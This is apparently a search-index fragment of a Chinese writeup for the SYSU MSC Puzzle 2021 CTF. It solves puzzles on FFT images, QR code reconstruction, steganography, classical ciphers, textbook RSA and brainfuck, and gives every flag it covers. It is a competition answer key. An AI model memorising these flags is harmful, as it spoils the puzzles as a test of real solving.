\u6240\u4ee5\u5e2e\u6211\u627e\u5230\u85cf\u5728\u56fe\u7247\u91cc\u7684\u79d8\u5bc6\u5427\uff01\u54e6\u5bf9\u4e86\uff0c\u8fd9\u91cc\u8fd8\u6709\u4e00\u5f20\u5c0f\u7eb8\u6761\uff0c\u5e94\u8be5\u80fd\u5e2e\u5230\u4f60\uff08 0.8560967955058971 17.682512473330895 https://mscpuzzle.oss-cn-guangzhou.aliyuncs.com/2021/cv.zip \u9898\u76ee\u4ee3\u7801 import cv2 import numpy as np def mapping ( data , down = 0 , up = 255 , tp = np . uint8 ): data_max = data . max () data_min = data . min () interval = data_max - data_min new_interval = up - down new_data = ( data - data_min ) * new_interval / interval + down new_data = new_data . astype ( tp ) return new_data def fft ( img ): fft = np . fft . fft2 ( img ) fft = np . fft . fftshift ( fft ) m = np . log ( np . abs ( fft )) p = np . angle ( fft ) return m , p if __name__ == '__main__' : img = cv2 . imread ( f 'answer.png' , cv2 . IMREAD_GRAYSCALE ) m , p = fft ( img ) print ( m . min (), m . max ()) new_img1 = mapping ( m ) new_img2 = mapping ( p ) cv2 . imwrite ( f 'cv1.png' , new_img1 ) cv2 . imwrite ( f 'cv2.png' , new_img2 ) \u4e00\u4e2a FFT\uff0c\u76f4\u63a5\u628a\u4ee3\u7801\u9006\u56de\u53bb\u5c31\u597d\u4e86\uff1a import cv2 import numpy as np def mapping ( data , down = 0 , up = 255 , tp = np . uint8 ): data_max = data . max () data_min = data . min () interval = data_max - data_min new_interval = up - down new_data = ( data - data_min ) * new_interval / interval + down new_data = new_data . astype ( tp ) return new_data if __name__ == '__main__' : img1 = cv2 . imread ( \"cv1.png\" , cv2 . IMREAD_GRAYSCALE ) img2 = cv2 . imread ( \"cv2.png\" , cv2 . IMREAD_GRAYSCALE ) m = mapping ( img1 , 0.8560967955058971 , 17.682512473330895 ) p = mapping ( img2 , 0 , 2 * np . pi ) res = m * ( np . cos ( p ) + np . sin ( p ) * 1 j ) ishift = np . fft . ifftshift ( res ) iimg = np . fft . ifft2 ( ishift ) iimg = np . abs ( iimg ) iimg = mapping ( iimg ) cv2 . imwrite ( f 'answer.png' , iimg ) flag: msc{The_master_of_cv} \u6df7\u4e71\u7684\u4e8c\u7ef4\u7801 \u00b6 \u4f60\u597d\uff01\u52c7\u58eb\uff0c\u4f60\u8d70\u5230\u8fd9\u91cc\u5df2\u7ecf\u8bc1\u660e\u4e86\u4f60\u7684\u5b9e\u529b\uff01 \u6211\u672c\u8be5\u7ed9\u4f60\u7684\u662f\u4e00\u5f20\u8bb0\u5f55\u7740\u7b54\u6848\u7684\u4e8c\u7ef4\u7801\uff0c\u4f46\u7531\u4e8e\u5728\u4f20\u8f93\u8fc7\u7a0b\u4e2d\u6211\u4eec\u5fd8\u8bb0\u6807\u6ce8\u6bcf\u4e00\u884c\u7684\u987a\u5e8f\u4e86\uff0c\u5bfc\u81f4\u6211\u4eec\u6536\u5230\u4e86\u8fd9\u6837\u7684\u6570\u636e\u2026\u2026\u52c7\u58eb\uff0c\u4f60\u80fd\u8fd8\u539f\u51fa\u5b83\u7684\u539f\u59cb\u6a21\u6837\u5417\uff1f \u9898\u76ee [ \"10111010111000011000001011101\" , \"00111010110010101000000000010\" , \"11100001101100100001011010110\" , \"10000010000111101111111111101\" , \"10111010000010001000001011101\" , \"01110011010111001001011100001\" , \"10101101110101001110000110010\" , \"10111010111010111110001011101\" , \"10010100110101101111100111110\" , \"10111110011101011000011010111\" , \"11001010001011011000000001000\" , \"10111010100101100111111110100\" , \"10000010110010110100100011001\" , \"11111110101010101010101111111\" , \"10111010001100010100110110111\" , \"11111110101101010101110110000\" , \"00000000100100100101100011100\" , \"00000000111001101011011111001\" , \"11111100100110010010001011110\" , \"00010001110001001101110001010\" , \"10000010111110001101101000001\" , \"11001110110110010101100100001\" , \"11011110111101111101111110100\" , \"11111110100010100101101011100\" , \"00000000011111011001100000000\" , \"10111010111001000110010100010\" , \"11111110101110011001001111111\" , \"10000010001100011010101000001\" , \"10011111111101000101110010111\" ] \u628a\u8fd9\u4e9b\u503c\u8f93\u5165\u5230 csv \u4e2d\uff0c\u7136\u540e Excel \u6253\u5f00\uff0c\u8c03\u4e00\u8c03\u683c\u5f0f\uff0c\u5f00\u59cb\u6309\u7167\u4e8c\u7ef4\u7801\u7684\u89c4\u5219\uff08\u4e09\u4e2a\u5b9a\u4f4d\u70b9\uff0c\u5bf9\u9f50\u56fe\u6837\u3001\u65f6\u5e8f\u56fe\u6837\u7b49\uff09\u6765\u786e\u5b9a\u53ef\u4ee5\u786e\u5b9a\u7684\u884c\uff0c\u7ed3\u679c\uff1a \u4e0a\u9762\u6709 2 \u884c\u987a\u5e8f\u4e0d\u786e\u5b9a\uff0c\u4e2d\u95f4\u6709 11 \u884c\u987a\u5e8f\u4e0d\u786e\u5b9a\uff08\u5176\u4e2d\u7531\u4e8e\u65f6\u5e8f\u56fe\u6837\u7684\u539f\u56e0\uff0c\u6240\u4ee5\u76f8\u5f53\u4e8e\u6709 5 \u884c\u987a\u5e8f\u4e0d\u786e\u5b9a\u548c 6 \u884c\u987a\u5e8f\u4e0d\u786e\u5b9a\uff09\uff0c\u6240\u4ee5\u603b\u5171\u6709 2*5!*6! = 172800 \u79cd\u53ef\u80fd\uff0c\u6240\u4ee5\u53ef\u4ee5\u679a\u4e3e\u4e86\u3002\u53ef\u4ee5\u4f7f\u7528 pyzbar \u8fd9\u4e2a\u5305\u6765\u81ea\u52a8\u89e3\u4e8c\u7ef4\u7801 \u6539\u4e00\u6539 GZTime 2021 \u7965\u4e91\u676f\u7684 writeup \u91cc\u7684\u4ee3\u7801\uff1a \u4ee3\u7801 data = [ \"11111110101110011001001111111\" , \"10000010111110001101101000001\" , \"10111010111010111110001011101\" , # <- \u8fd9\u4e24\u884c\u9700\u8981\u624b\u52a8\u8c03\u6362\u5404\u8dd1\u4e00\u6b21 \"10111010000010001000001011101\" , \"10111010111000011000001011101\" , # <- \u8fd9\u4e24\u884c\u9700\u8981\u624b\u52a8\u8c03\u6362\u5404\u8dd1\u4e00\u6b21 \"10000010001100011010101000001\" , \"11111110101010101010101111111\" , \"00000000011111011001100000000\" , \"10011111111101000101110010111\" , \"11100001101100100001011010110\" , \"00111010110010101000000000010\" , \"10101101110101001110000110010\" , \"01110011010111001001011100001\" , \"10010100110101101111100111110\" , \"10111110011101011000011010111\" , \"00000000111001101011011111001\" , \"11001010001011011000000001000\" , \"11111100100110010010001011110\" , \"11001110110110010101100100001\" , \"00010001110001001101110001010\" , \"11011110111101111101111110100\" , \"00000000100100100101100011100\" , \"11111110100010100101101011100\" , \"10000010110010110100100011001\" , \"10111010100101100111111110100\" , \"10111010111001000110010100010\" , \"10111010001100010100110110111\" , \"10000010000111101111111111101\" , \"11111110101101010101110110000\" ] import pyzbar.pyzbar as pyzbar from itertools import permutations from PIL import Image , ImageDraw as draw import matplotlib.pyplot as plt from tqdm import tqdm shuffle_1 = [ 9 , 11 , 13 , 15 , 17 , 19 ] shuffle_2 = [ 10 , 12 , 14 , 16 , 18 ] head = data [: 9 ] tail = data [ 20 :] def body ( body_1 , body_2 ): # \u83b7\u53d6\u4e2d\u95f4\u90e8\u5206\u7684\u4e00\u79cd\u6392\u5217 body = [] for i in range ( 5 ): body . append ( body_1 [ i ]) body . append ( body_2 [ i ]) body . append ( body_1 [ 5 ]) return [ data [ i ] for i in body ] def draw_img ( data ): # \u751f\u6210\u4e8c\u7ef4\u7801\u56fe\u7247 assert len ( data ) == 29 and len ( data [ 0 ]) == 29 img = Image . new ( 'RGB' , ( 31 , 31 ), ( 255 , 255 , 255 )) for i , row in enumerate ( data ): for j , pixel in enumerate ( row ): img . putpixel (( j + 1 , i + 1 ), ( 0 , 0 , 0 ) if pixel == \"1\" else ( 255 , 255 , 255 )) return img with tqdm ( total = 86400 ) as pbar : for body_1 in permutations ( shuffle_1 ): for body_2 in permutations ( shuffle_2 ): im = draw_img ( head + body ( body_1 , body_2 ) + tail ) barcodes = pyzbar . decode ( im ) pbar . update ( 1 ) if ( len ( barcodes ) == 0 ): continue for barcode in barcodes : barcodeData = barcode . data . decode ( \"utf-8\" ) print ( barcodeData ) plt . imshow ( im ) plt . show () \u53ef\u4ee5\u8dd1\u51fa\u53ef\u89e3\u7684\u4e8c\u7ef4\u7801\u548c flag\uff1a flag\uff1amsc{You_ar3_g0od_4t_QR_Code}","title":"SYSU MSC Puzzle 2021"},{"location":"writeups/sysu_msc_puzzle/#sysu-msc-puzzle-2021-writeup","text":"MSC Puzzle \u662f\u7531\u4e2d\u5c71\u5927\u5b66 MSClub \u4e0e\u4e2d\u5c71\u5927\u5b66 W4terDr0p \u6218\u961f\u8054\u5408\u4e3e\u529e\u7684\u8da3\u5473\u6027\u89e3\u8c1c\u6e38\u620f Abstract \u57fa\u672c\u4e0a\u90fd\u662f GZTime \u51fa\u7684\u9898\uff0c\u7b97\u5230 CTF \u91cc\u5c31\u90fd\u662f misc \u7c7b\uff0c\u4e00\u5171 24 \u9053\u9898\uff0c\u4e0b\u9762\u662f\u7b80\u8981\u7684 writeup\uff1a","title":"SYSU MSC Puzzle 2021 Writeup"},{"location":"writeups/sysu_msc_puzzle/#_1","text":"\u5ba3\u4f20\u6d77\u62a5\u548c\u9996\u9875\u90fd\u6709\uff0cflag\uff1a msc{He1lo_Wor1d}","title":"\u4f60\u597d\uff01\u52c7\u58eb"},{"location":"writeups/sysu_msc_puzzle/#_2","text":"-.-. --- -.. . --- ..-. - .... . .---- ----. - .... -.-. . -. - ..- .-. -.-- \u6469\u5c14\u65af\u7535\u7801\uff0c\u6839\u636e\u9996\u9875\u7684\u8bf4\u660e\u5728\u5355\u8bcd\u95f4\u52a0\u4e0a\u4e0b\u5212\u7ebf\u5f97\u5230 flag\uff1a msc{CODE_OF_THE_19TH_CENTURY}","title":"\u8001\u53e4\u8463"},{"location":"writeups/sysu_msc_puzzle/#_3","text":"\u6253\u5f00 DevTools \u770b Console\uff0cflag\uff1a msc{Wow_Y0u_f1nd_me}","title":"\u8eb2\u5728\u5899\u540e"},{"location":"writeups/sysu_msc_puzzle/#_4","text":"\u6253\u5f00 DevTools \u770b\u4ee3\u7801\uff0c\u6709\u4e00\u4e2a display: none \u7684 flag\uff1a msc{Inv1sibility_P0tiOn}","title":"\u9690\u8eab\u836f\u6c34"},{"location":"writeups/sysu_msc_puzzle/#_5","text":"We, the rustling leaves, have a voice that answers the storms, but who are you so silent? I am _ ____. \u641c\u7d22\u8fd9\u6bb5\u8bd7\u6b4c\u5f97\u5230\u7a7a\u7f3a\u5185\u5bb9\uff0c\u683c\u5f0f\u5316\u4e00\u4e0b\u5f97\u5230 flag\uff1a msc{a_mere_flower}","title":"\u5b8c\u5f62\u586b\u7a7a"},{"location":"writeups/sysu_msc_puzzle/#_6","text":"\u53bb\u627e\u90a3\u4e2a\u5730\u65b9\u5427\uff01\ud83d\udc7b.\ud83d\udc7e.sysums.club \u5e76\u4e14\u53ef\u4ee5\u53d1\u73b0\u6709\u4e00\u4e2a display: none \u7684 TXT \u5b57\u6837 \u94fe\u63a5\u76f4\u63a5\u8f6c\u5230\u7684\u5730\u5740\u662f http://xn--9q8h.xn--dr8h.sysums.club/ \u6240\u4ee5\u7528 dig \u547d\u4ee4\u67e5\u8be2\u4e00\u4e0b\u8fd9\u4e2a\u57df\u540d\u7684 TXT \u8bb0\u5f55\u5c31\u53ef\u4ee5\u4e86 dig xn--9q8h.xn--dr8h.sysums.club txt flag\uff1a msc{Domain_w1th_IDNs}","title":"\u53bb\u95ee\u5bfc\u822a"},{"location":"writeups/sysu_msc_puzzle/#_7","text":"The answer to the ultimate question of life, the universe, and everything equals to A^3 + B^3 + C^3 \u52c7\u58eb\uff0c\u8fd9\u9053\u9898\u7684\u7b54\u6848\u662f msc{A+B+C} \u4e16\u95f4\u4e07\u7269\u7684\u7b54\u6848\u5373\u6307 42\uff0c\u7136\u540e\u641c\u7d22\u5f97\u5230 \\[ -80538738812075974^3 + 80435758145817515^3+ 12602123297335631^3 = 42 \\] \u6240\u4ee5 flag\uff1a msc{12499142631077172}","title":"\u4e16\u95f4\u4e07\u7269\u7684\u7b54\u6848"},{"location":"writeups/sysu_msc_puzzle/#_8","text":"\u6211\u4eec\u7684\u9152\u9986\u91c7\u7528\u6700\u65b0\u7684 HTCPCP/1.0 \u534f\u8bae\u4e3a\u60a8\u63d0\u4f9b\u670d\u52a1\uff01 \u201c\u563f\uff0c\u9152\u4fdd\uff01\u6211\u7684\u5496\u5561\u5462\uff1f\u201d \u201c\u5728\u505a\u4e86\uff01\u201d \u8be5\u6b7b\uff0c\u6211\u5fd8\u4e86\u8ba9\u4ed6\u5c11\u52a0\u70b9\u725b\u5976\uff0c\u6211\u5f97\u7acb\u523b\u8ba9\u4ed6\u505c\u4e0b\uff01 \u641c\u7d22 HTCPCP/1.0 \uff08\u8d85\u6587\u672c\u5496\u5561\u58f6\uff09\u534f\u8bae\uff0c\u505c\u6b62\u52a0\u5165\u725b\u5976\u7684\u8bf7\u6c42\u662f WHEN\uff0c\u6240\u4ee5 flag\uff1a msc{WHEN}","title":"\u6211\u7684\u5496\u5561"},{"location":"writeups/sysu_msc_puzzle/#_9","text":"\u300c\u6211\u60f3\u8981\u8fd9\u4e2a\u5b57\u5c0f\u4e00\u70b9\u7684\u540c\u65f6\u5927\u4e00\u70b9\u300d ww91igfYzsb0AguGyMvZDcbKzxnPz25LCIekBxnJE1qWxZrUB3rOzxjFqMfZzty0Fq== \u5927\u5199\u8f6c\u5c0f\u5199\uff0c\u5c0f\u5199\u8f6c\u5927\u5199\uff0c\u7136\u540e base64 \u89e3\u7801\uff0c\u5f97\u5230 flag\uff1a msc{T0_4nother_Base64}","title":"\u8bbe\u8ba1\u5e08"},{"location":"writeups/sysu_msc_puzzle/#_10","text":"https://mscpuzzle.oss-cn-guangzhou.aliyuncs.com/2021/phone.mp3 \u662f\u4e00\u4e32\u7535\u8bdd\u7684\u62e8\u53f7\u97f3\uff0c\u653e\u5230 Au \u91cc\u9762\u770b\u9891\u8c31\uff0c\u628a\u5bf9\u5e94\u6309\u952e\u6284\u4e0b\u6765\u5c31\u884c\u4e86\uff0c\u5177\u4f53\u662f\u4ec0\u4e48\u8bb0\u4e0d\u5f97\u4e86","title":"\u76d1\u542c\u7535\u8bdd"},{"location":"writeups/sysu_msc_puzzle/#_11","text":"https://mscpuzzle.oss-cn-guangzhou.aliyuncs.com/2021/msc.png stegsolve \u6253\u5f00\uff0c\u5728 red 0 \u53ef\u4ee5\u6e05\u6670\u770b\u5230 flag\uff1a msc{Text_Hidd3n_Und6r_The_1mage}","title":"\u4e00\u5f20\u56fe\u7247"},{"location":"writeups/sysu_msc_puzzle/#_12","text":"..., 22, 30, 42, 56, ? , 101, 135, 176, 231, 297, ... ..., 72, 81, 90, 100, 110, ?, 132, 144, 156, 169, ... ..., 43, 47, 55, 67, 79, ?, 123, 155, 171, 175, ... ..., 891, 9805, 25, 527, 23, ?, 17, 37, 131, 43, ... ..., 58, 51, 89, 28, 97, ?, 30, 103, 107, 62, ... ..., 20, 26, 36, 50, 60, ?, 135, 138, 248, 315, ... ..., 2, 1, 9, 35, 77, ?, 91, 49, 15, 2, ... ..., 49, 62, 70, 77, 91, ?, 103, 107, 115, 122, ... ..., 8, 26, 60, ?, 196, 308, 456, 645, 880, 1166, ... \u76f4\u63a5\u5206\u522b\u7c98\u8d34\u5230 OEIS \u4e2d\uff0c\u5f97\u5230\u9700\u8981\u586b\u7684\u6570\u5b57\uff1a 77 121 95 83 101 114 105 101 115 \u770b\u6570\u5b57\u8303\u56f4\u633a\u89c4\u6574\uff0cASCII \u8f6c\u6362\u4e00\u4e0b\u5f97\u5230 flag\uff1a msc{My_Series}","title":"\u6570\u5b57\u5e8f\u5217"},{"location":"writeups/sysu_msc_puzzle/#_13","text":"https://mscpuzzle.oss-cn-guangzhou.aliyuncs.com/2021/signal.mp3 \u6211\u89c9\u5f97\uff0c\u8fd9\u91cc\u9762\u6709\u8e4a\u8df7\uff01\u4f60\u77e5\u9053\u4e8c\u5341\u4e16\u7eaa\u4e94\u516d\u5341\u5e74\u4ee3\u7684\u7535\u89c6\u662f\u4f7f\u7528\u6444\u50cf\u7ba1\u548c\u7535\u5b50\u76d1\u89c6\u5668\u5236\u6210\u7684\u5417\uff1f \u6240\u4ee5\u5e94\u8be5\u662f SSTV\uff08\u6162\u626b\u63cf\u7535\u89c6\uff09\u4f20\u8f93\u56fe\u7247\uff0c\u7528\u624b\u673a\u8f6f\u4ef6 Robot36 \u5c31\u53ef\u4ee5\u8f6c\u6362\uff0c\u5f97\u5230\uff1a \u626b\u63cf\u5f97\u5230 flag\uff1a msc{SSTV_transfer_image}","title":"\u672a\u77e5\u4fe1\u53f7"},{"location":"writeups/sysu_msc_puzzle/#_14","text":"https://mscpuzzle.oss-cn-guangzhou.aliyuncs.com/2021/msc2.png \u8fd8\u662f\u6254\u5230 stegsolve \u91cc\uff0c\u5728 red0 green0 blue0 \u5206\u522b\u80fd\u770b\u5230\u6587\u5b57\uff0c\u5408\u8d77\u6765\u662f \u5bc6\u7801\u662f p455w0rd binwalk \u53ef\u4ee5\u53d1\u73b0\u8fd9\u4e2a png \u91cc\u504f\u79fb 0xC23A \u540e\u9762\u85cf\u4e86\u4e00\u4e2a zip\uff0c\u63d0\u53d6\u51fa\u6765\u7528\u5bc6\u7801\u89e3\u538b\u5f97\u5230\u4e00\u4e2a svg \u6587\u4ef6 \u6d4f\u89c8\u5668\u6253\u5f00\u4e4b\u540e\u53d1\u73b0\u6709\u4e00\u4e2a\u767d\u8272\u77e9\u5f62\uff0c\u5220\u6389\u5b83\u5c31\u80fd\u770b\u5230 flag\uff1a msc{svg_The_vectors}","title":"\u53c8\u4e00\u5f20\u56fe\u7247"},{"location":"writeups/sysu_msc_puzzle/#_15","text":"\u2838\u2829\u282e\u2830\u2824\u2806\u2818\u2806\u2810\u2837\u282d\u2818\u2812\u2810\u2809\u2815\u280e\u2839\u282d\u280c\u2806\u283c\u282c\u2839\u2802\u280c\u2806\u283c\u283e\u281c\u2832\u2824\u282d\u2818\u2806\u2810\u283b\u2819\u282d\u2838\u2831 Tip: \u5c06\u7ed3\u679c\u56db\u820d\u4e94\u5165\u4fdd\u7559 7 \u4f4d\u5c0f\u6570\uff0c\u5e76\u7528_\u66ff\u6362\u5c0f\u6570\u70b9\u540e\u63d0\u4ea4 \u5bf9\u7167\u6559\u7a0b https://nemeth.aphtech.org/ \u5b66\u4e60\uff0c\u8f6c\u6362\u516c\u5f0f\uff1a \\[ \\int_{-2}^2(x^3\\cos\\frac{x}{2}+\\frac{1}{2})\\sqrt{4-x^2}\\mathrm dx = \\pi \\approx 3.1415927 \\] \u6240\u4ee5 flag\uff1a msc{3_1415927}","title":"\u76f2\u4eba\u6570\u5b66\u5bb6"},{"location":"writeups/sysu_msc_puzzle/#_16","text":"\u52c7\u58eb\uff0c\u636e\u8bf4\u8fd9\u4e2a\u4e16\u754c\u5728\u5f88\u4e45\u8fdc\u7684\u65f6\u5019\u6709\u4e00\u4f4d\u51ef\u6492\u5927\u5e1d\uff0c\u5728\u4ed6\u79bb\u4e16\u7684\u65f6\u5019\uff0c\u4e3a\u8fd9\u4e2a\u4e16\u754c\u521b\u9020\u4e86\u4e00\u79cd\u6700\u5c0f\u7684\u8bed\u8a00\uff0c\u6211\u4eec\u90fd\u4e0d\u6562\u8bfb\u51fa\u5b83\u7684\u540d\u79f0\u2026\ubrainfuck \u8f93\u51fa\u5f97\u5230\uff1a =WYxy^WXArn(qs|p!-k<~<X4i;A[!n97zu4Yru{@=={qkw+78tx~[94:*By66&@U<5.&;66&:047V@D[,r:60}55^{yX<3@u~.sv/m4(]i)1pV!op[(Z:54f/ssgt(!XZ|xq|ouuv+@|!=u \u6839\u636e\u9898\u9762\u7684\u51ef\u6492\uff0c\u53ef\u4ee5\u63a8\u6d4b\u662f ASCII \u504f\u79fb\uff0c\u7136\u540e\u628a\u8f93\u51fa\u9650\u5236\u5728 [33, 126] \u4e2d\uff08ASCII\u53ef\u89c1\u5b57\u7b26\uff09\uff0c\u7b2c 54 \u6b21\u504f\u79fb\u7684\u7ed3\u679c\uff1a v24ST923zMIaLNWKZfFuYu3mDtz6ZIrpUPm4MPVyvvVLFRdpqOSY6rmsc{Too_y0ung_too_simp1y}6eMsoiXnn9VT3ulyPYgNQhHma8DbjK1ZJK6a5snmAhNNBOaZ35WSLWJPPQdyWZvP \u4e2d\u95f4\u5c31\u662f flag\uff1a msc{Too_y0ung_too_simp1y}","title":"\u6700\u5c0f\u7684\u8bed\u8a00"},{"location":"writeups/sysu_msc_puzzle/#_17","text":"\u201c\u52c7\u58eb\uff0c\u6211\u542c\u8fc7\u4e00\u4e2a\u53e4\u8001\u7684\u4f20\u8bf4\u2026\u2026\u201d \u201c\u8bf7\u8bb2\uff01\u201d \u300c1024\u00d7768 \u5927\u5c0f\u7684\u56fe\u7247\uff0c\u53ef\u4ee5\u8f7b\u677e\u85cf\u4e0b 786432 \u4e2a\u5730\u5740\u3002\u300d https://mscpuzzle.oss-cn-guangzhou.aliyuncs.com/2021/justcolor.png \u4e00\u4e2a\u7eaf\u8272\u6587\u4ef6\uff0c\u6839\u636e\u9898\u9762\u53ef\u4ee5\u63a8\u6d4b\u662f\u8bfb\u53d6 rgba \u503c\u4f5c\u4e3a ip \u5730\u5740 \u6240\u4ee5\u5199\u4e2a\u811a\u672c\u8bfb\u4e00\u4e0b from PIL import Image ; print ( Image . open ( \"justcolor.png\" ) . getpixel (( 0 , 0 ))) \uff0c\u5f97\u5230 ip \u5730\u5740\uff1a116.63.166.50 \u8bbf\u95ee\u5f97\u5230 flag\uff1a msc{Hide_IP_in_RGBA}","title":"\u4e00\u4e2a\u4f20\u8bf4"},{"location":"writeups/sysu_msc_puzzle/#_18","text":"\u4f60\u53d1\u73b0\u4e86\u4e00\u5757\u5e03\u6ee1\u82d4\u85d3\u7684\u77f3\u677f\uff0c\u4e0a\u9762\u523b\u7740\u4e0b\u9762\u7684\u51e0\u4e2a\u5b57\uff1a \u2003\u22a7\u00e3\u22b7\u00ac\u00a7\u00d7\u00e3\u02c6\ud835\udd0e \u4f60\u770b\u4e0d\u61c2\uff0c\u4f46\u5927\u53d7\u9707\u64bc\u3002 \u8def\u8fb9\u6709\u4e2a\u795e\u79d8\u7684\u9ed1\u8863\u5546\u4eba\uff0c\u4ed6\u81ea\u79f0\u80fd\u4e3a\u4f60\u63d0\u4f9b\u5e2e\u52a9\uff0c\u4f46\u662f\u6709\u4e00\u4e2a\u82db\u523b\u7684\u6761\u4ef6\uff1a\u4f60\u5fc5\u987b\u5728\u6bcf\u5929\u51cc\u6668\u56db\u70b9\u7684\u7b2c\u4e00\u4e2a\u516b\u5206\u949f\u5185\u8fc7\u6765\u627e\u4ed6\uff0c\u4ed6\u624d\u80fd\u7ed9\u4f60\u63d0\u4f9b\u7ebf\u7d22\u3002 \u8c03\u6574\u65f6\u95f4\u5230\u51cc\u6668\u56db\u70b9\u7684\u7b2c\u4e00\u4e2a\u516b\u5206\u949f\u5185\uff0c\u5f97\u5230 hint\uff1a \u5546\u4eba\u770b\u7740\u4f60\uff0c\u4ec0\u4e48\u8bdd\u4e5f\u6ca1\u8bf4\uff0c\u7ed9\u4f60\u9012\u4e86\u4e00\u5f20\u7eb8\u6761\uff0c\u4e0a\u9762\u5199\u7740\uff1acharref\u3002 \u641c\u7d22\u5f97\u5230\u5b57\u7b26\u5bf9\u7167\u8868\uff1a https://dev.w3.org/html5/html-author/charref \u7136\u540e\u4f9d\u6b21\u641c\u7d22\u8fd9\u4e9b\u5b57\u7b26\uff0c\u9996\u5b57\u6bcd\u62fc\u8d77\u6765\u5c31\u662f flag\uff1a msc{mainstacK}","title":"\u65f6\u95f4\u5546\u4eba"},{"location":"writeups/sysu_msc_puzzle/#_19","text":"\u4e00\u5f20\u901a\u7f09\u4ee4\u8d34\u5728\u6751\u53e3\u7684\u516c\u544a\u724c\u4e0a\uff0c\u636e\u8bf4\u6355\u83b7\u5230\u4e86\u76d7\u8d3c\u4e0b\u4e00\u6b21\u8981\u4f5c\u6848\u7684\u5730\u65b9\uff0c\u4f46\u6ca1\u4eba\u770b\u5f97\u61c2\u3002 7PMM399R+FQ2 \u201c\u54e6\uff0c\u4f60\u53ea\u9700\u8981\u7528**********\u5c31\u80fd\u5f97\u5230\u7b54\u6848\u201d \u201c\u54e6\uff01\u6536\u5230\uff01\u201d \u201c\u4f60\u77e5\u9053 The simplest way to talk about location \u5417\uff1f\u201d \u201c\u77e5\u9053\u2026\u2026\u539f\u6765\u4f60\u5c31\u662f\u60f3\u8981\u90a3\u4e09\u4e2a\u5355\u8bcd\u554a\u201d \u76f4\u63a5\u4f7f\u7528 \u4e09\u8bcd\u5730\u5740 \u8c03\u6210\u82f1\u6587\u641c\u7d22 7PMM399R+FQ2 \u5f97\u5230\u4f4d\u7f6e\u7684\u4e09\u4e2a\u5355\u8bcd ///flux.tank.pitch \u6240\u4ee5 flag\uff1a msc{flux_tank_pitch}","title":"\u8ffd\u8e2a\u76ee\u6807"},{"location":"writeups/sysu_msc_puzzle/#_20","text":"\u95ee\u9898 from Crypto.Util.number import * p = 0xbb1a21ab46e16672a6dfe537c5d03121252685a1a72fab827ed14d61caa80f68b9bda9fb0d9651719ab099d05fd0da03443a50106533f1034a81e280cd3e85fd q = 0x85eed89c104292b715a45ec8a1c3328506b429c2b7477c9ab094313fcf0020ba7352b102608cab79bde92978aedb052a546fb289c453feac87ee791ba1019579 n = p * q e = 0x10001 answer = b 'something you dont know' m = bytes_to_long ( answer ) c = pow ( m , e , n ) # c = 0x17c7af1ec9c020eb9d8f26049f002b58f93591a817ebff4c00e9e46254261db54a2c2d086dd0f532994329faf2133b1c7002913b187f898d87c8093b2290440e927 78956c60b92f27e3dc4d15b4c79f97b79bca253b0b4542375c37f8e37e1f8e38d728634133376eacd2c448aa523b2eda0b4c5f2af47250147f4193d58596c \u57fa\u7840\u7684 RSA\uff0c\u8ba1\u7b97\u51fa d \u7136\u540e\u89e3\u5bc6\u5c31\u53ef\u4ee5\u5f97\u5230 flag\uff1a d = pow ( e , - 1 , ( p - 1 ) * ( q - 1 )) print ( long_to_bytes ( pow ( c , d , n ))) # b'msc{W0w_You_know_H0w_to_d3crypt_the_RSA}'","title":"\u7d27\u6025\u5524\u9192"},{"location":"writeups/sysu_msc_puzzle/#emojis","text":"\u201c\u8fd9\u662f\u4e00\u4e32 EMOJI \uff0c\u91cc\u9762\u4f1a\u85cf\u7740\u4ec0\u4e48\u6837\u7684\u4fe1\u606f\u5462\uff1f\u201d \ud83d\ude43\ud83d\udcb5\ud83c\udf3f\ud83c\udfa4\ud83d\udeaa\ud83c\udf0f\ud83d\udc0e\ud83e\udd4b\ud83d\udeab\ud83d\ude06\u2705\ud83d\ude0a\ud83d\udc49\ud83d\udc63\ud83d\udcc2\u23e9\ud83d\ude06\ud83c\udf3f\ud83c\udf2a\ud83d\ude0e\ud83c\udf75\u2603\ud83d\udcc2\ud83d\udeb9\ud83d\udc4c\ud83c\udff9\ud83d\udc0e\ud83c\udf3f\ud83d\ude00\ud83d\udc63\ud83c\udfce\ud83d\ude0d\ud83d\ude06\ud83c\udf74\u2705\ud83d\udc41\u2705\u2705\ud83d\ude06\ud83d\udd79\ud83d\udd2c\ud83d\udc0d\ud83c\udf85\u2716\ud83c\udf2a\ud83d\udc63\ud83d\udeb9\ud83d\udca7\ud83c\udf74\ud83d\udcb5\ud83c\udf4d\ud83c\udf2a\u2709\ud83d\udc41\ud83d\udeaa\ud83d\udd2a\u23e9\ud83d\udca7\ud83c\udf83\ud83e\udd4b\ud83d\udd79\ud83c\udf4e\ud83d\ude0a\u2139 \u54e6\u5bf9\u4e86\uff0c\u6211\u8981\u7684\u662f\u5ffd\u7565\u8bef\u5dee\u540e\u7684\u6570\u5b57\u54e6~ DevTools \u91cc\u53ef\u4ee5\u770b\u5230 display: none \u7684 aes\uff1f\u6240\u4ee5\u5e94\u8be5\u662f\u4f7f\u7528 emoji-aes \u6839\u636e\u9898\u9762\u4e2d\u7684\u5168\u5927\u5199\u3001\u4ee3\u7801\u5757\u5305\u88f9\u7684 EMOJI \uff0c\u53ef\u4ee5\u63a8\u6d4b\u51fa key \u5c31\u662f EMOJI\uff0c\u89e3\u5bc6\u5f97\u5230\uff1a ORANGE RED YELLOW GREEN GOLD \u6839\u636e\u989c\u8272\u4ee5\u53ca\u9898\u9762\u4e2d\u7684\u201c\u5ffd\u7565\u8bef\u5dee\u201d\u731c\u6d4b\u662f\u4e94\u8272\u73af\u7535\u963b\uff0c\u8f6c\u6362\u5f97\u5230\u5ffd\u7565\u8bef\u5dee\u540e\u662f 32400000 \u6b27\u59c6\uff0c\u6240\u4ee5 flag\uff1a msc{32400000}","title":"Emojis"},{"location":"writeups/sysu_msc_puzzle/#_21","text":"\u636e\u8bf4\u8fd9\u662f\u4e00\u79cd\u6781\u5176\u666e\u904d\u7684\u52a0\u5bc6\u65b9\u6cd5\u2026\u2026 \u800c\u4e14\u4efb\u4f55\u4eba\u90fd\u53ef\u4ee5\u89e3\u5bc6\u2026\u2026 \u6216\u8bb8\u2026\u2026\u4f60\u53ef\u4ee5\u542c\u5230\u6765\u81ea\u7b54\u6848\u7684\u58f0\u97f3\u2026\u2026 https://mscpuzzle.oss-cn-guangzhou.aliyuncs.com/2021/msc.enc 